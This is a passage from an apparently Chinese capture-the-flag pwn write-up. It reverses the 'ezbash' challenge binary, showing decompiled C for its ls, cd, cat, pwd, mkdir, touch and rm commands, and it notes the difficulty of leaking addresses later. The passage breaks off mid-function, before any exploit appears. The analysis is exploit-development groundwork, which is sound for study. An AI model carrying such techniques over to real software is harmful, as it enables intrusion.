    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;dest[v7 - v8], s1) )</span><br><span class="line">          <span class="built_in">puts</span>(v17-&gt;name);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: cannot access &#x27;%s&#x27;: Not a directory\n&quot;</span>, comment[nums]);</span><br><span class="line">        <span class="keyword">if</span> ( v16 &gt; <span class="number">1</span> &amp;&amp; nums &lt; v16 )</span><br><span class="line">          <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( checkfolder(v17) )</span><br><span class="line">      &#123;</span><br><span class="line">        cuurr_pos = v17;</span><br><span class="line">        v9 = <span class="built_in">strlen</span>(s1);</span><br><span class="line">        v13 += v9 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_32:</span><br><span class="line">      <span class="keyword">if</span> ( !comment[nums][v13 - <span class="number">1</span>] || comment[nums][v13 - <span class="number">1</span>] == <span class="number">47</span> &amp;&amp; !comment[nums][v13] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v16 &gt; <span class="number">1</span> )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%s:\n&quot;</span>, comment[nums]);</span><br><span class="line">        info_ls();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v16 &gt; <span class="number">1</span> &amp;&amp; nums &lt; v16 )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( cuurr_pos-&gt;futher )</span><br><span class="line">      cuurr_pos = cuurr_pos-&gt;futher;</span><br><span class="line">LABEL_16:</span><br><span class="line">    v6 = <span class="built_in">strlen</span>(s1);</span><br><span class="line">    v13 += v6 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>讲真 ls 代码很长，但是没啥用，特别是那个 alloca，就是浪费时间。</p>
<h4 id="cd"><a class="markdownIt-Anchor" href="#cd">#</a> cd</h4>
<p>cd 也是一个简单的跳到跳到某个目录下，实际就是更改下那两个变量，以及链表的遍历。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">acd</span><span class="params">(<span class="type">char</span> **cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// al</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> len_name; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s1; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  file *pos; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> delim[<span class="number">2</span>]; <span class="comment">// [rsp+36h] [rbp-1Ah] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( cmd[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cmd[<span class="number">2</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      fwrite(<span class="string">&quot;ezbash: too many arguments\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x1B</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(delim, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( s1 = strtok(cmd[<span class="number">1</span>], delim); s1; s1 = strtok(<span class="number">0LL</span>, delim) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;.&quot;</span>) )                  <span class="comment">// 当前目录下或者父目录</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, off_4077) )          <span class="comment">// ../</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( cuurr_pos-&gt;futher )</span><br><span class="line">            &#123;</span><br><span class="line">              len_name = <span class="built_in">strlen</span>(cuurr_pos-&gt;name);</span><br><span class="line">              cur_position_addr[(<span class="built_in">strlen</span>(cur_position_addr) - <span class="number">1</span> - len_name)] = <span class="number">0</span>;</span><br><span class="line">              cuurr_pos = cuurr_pos-&gt;futher;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            pos = cuurr_pos-&gt;firstson;          <span class="comment">// ./</span></span><br><span class="line">            ((&amp;check_error + <span class="number">1</span>))();</span><br><span class="line">            <span class="keyword">if</span> ( v1 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: %s: No such file or directory\n&quot;</span>, s1);</span><br><span class="line">              <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( pos &amp;&amp; <span class="built_in">strcmp</span>(pos-&gt;name, s1) )<span class="comment">// 参数的第一的目标位置文件夹</span></span><br><span class="line">              pos = pos-&gt;next_bro;</span><br><span class="line">            <span class="keyword">if</span> ( !checkfolder(pos) )            <span class="comment">// 检查是否为目录</span></span><br><span class="line">            &#123;</span><br><span class="line">              fwrite(<span class="string">&quot;something wrong happened\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x19</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">              <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cuurr_pos = pos;</span><br><span class="line">            v3 = <span class="built_in">strlen</span>(cur_position_addr);</span><br><span class="line">            <span class="keyword">if</span> ( v3 + <span class="built_in">strlen</span>(pos-&gt;name) &lt;= <span class="number">0x50</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">strcat</span>(cur_position_addr, pos-&gt;name);</span><br><span class="line">              *&amp;cur_position_addr[<span class="built_in">strlen</span>(cur_position_addr)] = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;ezbash: expected argument\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x1A</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="cat"><a class="markdownIt-Anchor" href="#cat">#</a> cat</h4>
<p>cat 会输出文件中的数据，采用的是 puts，只会输出字符串。为实现 cat 重定向到文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">acat</span><span class="params">(<span class="type">char</span> **cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// rsp</span></span><br><span class="line">  _BYTE v4[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> **comment; <span class="comment">// [rsp+10h] [rbp-68h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+1Fh] [rbp-59h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+24h] [rbp-54h]</span></span><br><span class="line">  file *v9; <span class="comment">// [rsp+28h] [rbp-50h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+30h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+38h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+40h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  comment = cmd;</span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  num = <span class="number">0</span>;                                      <span class="comment">// 参数的数目</span></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;                                       <span class="comment">// v7 最大参数的长度</span></span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( comment[++num] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(comment[num]) &gt; v7 )</span><br><span class="line">      v7 = <span class="built_in">strlen</span>(comment[num]) + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = v7 - <span class="number">1LL</span>;</span><br><span class="line">  v1 = <span class="number">16</span> * ((v7 + <span class="number">15LL</span>) / <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( v4 != &amp;v4[-(v1 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL)] )</span><br><span class="line">    ;</span><br><span class="line">  v2 = alloca(v1 &amp; <span class="number">0xFFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (v1 &amp; <span class="number">0xFFF</span>) != <span class="number">0</span> )</span><br><span class="line">    *&amp;v4[(v1 &amp; <span class="number">0xFFF</span>) - <span class="number">8</span>] = *&amp;v4[(v1 &amp; <span class="number">0xFFF</span>) - <span class="number">8</span>];</span><br><span class="line">  dest = v4;</span><br><span class="line">  num = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !comment[<span class="number">1</span>] )</span><br><span class="line">    fwrite(<span class="string">&quot;ezbash: missing operand\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x18</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  <span class="keyword">while</span> ( comment[num] )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = cuurr_pos-&gt;firstson;</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, comment[num]);</span><br><span class="line">    <span class="keyword">while</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(dest, v9-&gt;name) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v9-&gt;context )</span><br><span class="line">          <span class="built_in">puts</span>(v9-&gt;context);</span><br><span class="line">        v6 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = v9-&gt;next_bro;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ezbash: %s: No such file or directory\n&quot;</span>, comment[num]);</span><br><span class="line">    ++num;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="pwd"><a class="markdownIt-Anchor" href="#pwd">#</a> pwd</h4>
<p>仅仅只是输出当前的路径</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">apwd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(cur_position_addr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="exithelp"><a class="markdownIt-Anchor" href="#exithelp">#</a> exit,help</h4>
<p>没什么可以说的。</p>
<h4 id="mkdir"><a class="markdownIt-Anchor" href="#mkdir">#</a> mkdir</h4>
<p>在当前的目录下创建一个字目录，并把她 link 进 firstson 的链表，采用的是头插法。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">amkdir</span><span class="params">(<span class="type">char</span> **cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">2</span>]; <span class="comment">// [rsp+1Ah] [rbp-16h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  file *first_son; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  file *newfile; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  qmemcpy(v3, <span class="string">&quot;./&quot;</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="keyword">if</span> ( !cmd[<span class="number">1</span>] )</span><br><span class="line">    fwrite(<span class="string">&quot;ezbash: missing operand\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x18</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  <span class="keyword">while</span> ( cmd[v4] )</span><br><span class="line">  &#123;</span><br><span class="line">    first_son = cuurr_pos-&gt;firstson;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strchr</span>(cmd[v4], v3[<span class="number">0</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(cmd[v4], v3[<span class="number">1</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ((&amp;check_error + <span class="number">1</span>))();</span><br><span class="line">      <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, aEzbashCannotCr, cmd[v4++]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        newfile = calloc40();</span><br><span class="line">        newfile-&gt;flag = <span class="number">0</span>;</span><br><span class="line">        newfile-&gt;futher = cuurr_pos;</span><br><span class="line">        copy_name(newfile, cmd[v4]);</span><br><span class="line">        <span class="keyword">if</span> ( cuurr_pos-&gt;firstson )</span><br><span class="line">          link(first_son, newfile);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          cuurr_pos-&gt;firstson = newfile;</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="touch"><a class="markdownIt-Anchor" href="#touch">#</a> touch</h4>
<p>创建一个空文件，与 mkdir 的操作类似</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">atouch</span><span class="params">(<span class="type">char</span> **cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">2</span>]; <span class="comment">// [rsp+1Ah] [rbp-16h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  file *v5; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  file *v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  qmemcpy(v3, <span class="string">&quot;./&quot;</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="keyword">if</span> ( !cmd[<span class="number">1</span>] )</span><br><span class="line">    fwrite(<span class="string">&quot;ezbash: missing operand\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x18</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  <span class="keyword">while</span> ( cmd[v4] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strchr</span>(cmd[v4], v3[<span class="number">0</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strchr</span>(cmd[v4], v3[<span class="number">1</span>]) )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = cuurr_pos-&gt;firstson;</span><br><span class="line">      ((&amp;check_error + <span class="number">1</span>))();</span><br><span class="line">      <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = calloc40();</span><br><span class="line">        v6-&gt;flag = <span class="number">1</span>;</span><br><span class="line">        copy_name(v6, cmd[v4]);</span><br><span class="line">        <span class="keyword">if</span> ( cuurr_pos-&gt;firstson )</span><br><span class="line">          link(v5, v6);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          cuurr_pos-&gt;firstson = v6;</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mkdir 与 touch 创建新的 file 的时候，调用 calloc40，这个其实就是模拟了 calloc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">file *<span class="title function_">malloc40</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  file *v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(v1-&gt;name, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1-&gt;name));</span><br><span class="line">  v1-&gt;context = <span class="number">0LL</span>;</span><br><span class="line">  v1-&gt;firstson = <span class="number">0LL</span>;</span><br><span class="line">  v1-&gt;next_bro = <span class="number">0LL</span>;</span><br><span class="line">  v1-&gt;prev_bro = <span class="number">0LL</span>;</span><br><span class="line">  v1-&gt;futher = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file *__fastcall <span class="title function_">link</span><span class="params">(file *curr, file *aim)</span></span><br><span class="line">&#123;</span><br><span class="line">  file *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( curr-&gt;next_bro )</span><br><span class="line">    curr = curr-&gt;next_bro;</span><br><span class="line">  curr-&gt;next_bro = aim;</span><br><span class="line">  result = aim;</span><br><span class="line">  aim-&gt;prev_bro = curr;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这也导致了，后面泄露地址有点困难。两个命令支持在当前目录下一次创建多个对象</p>
<h4 id="rm"><a class="markdownIt-Anchor" href="#rm">#</a> rm</h4>
<p>rm 可以进行两种操作，直接删除文件，或者 - r 参数删除文件夹，但是都只是当前目录下的对象。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">arm</span><span class="params">(<span class="type">char</span> **cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+1Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  file *file; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  file *ptr; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !cmd[<span class="number">1</span>] )</span><br><span class="line">    fwrite(<span class="string">&quot;ezbash: missing operand\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x18</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  <span class="keyword">while</span> ( cmd[v3] )</span><br><span class="line">  &#123;</span><br><span class="line">    file = cuurr_pos-&gt;firstson;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(cmd[v3], <span class="string">&quot;-r&quot;</span>) )               <span class="comment">// -r</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( cmd[++v3] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( file )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(file-&gt;name, cmd[v3]) )</span><br><span class="line">          &#123;</span><br><span class="line">            v2 = <span 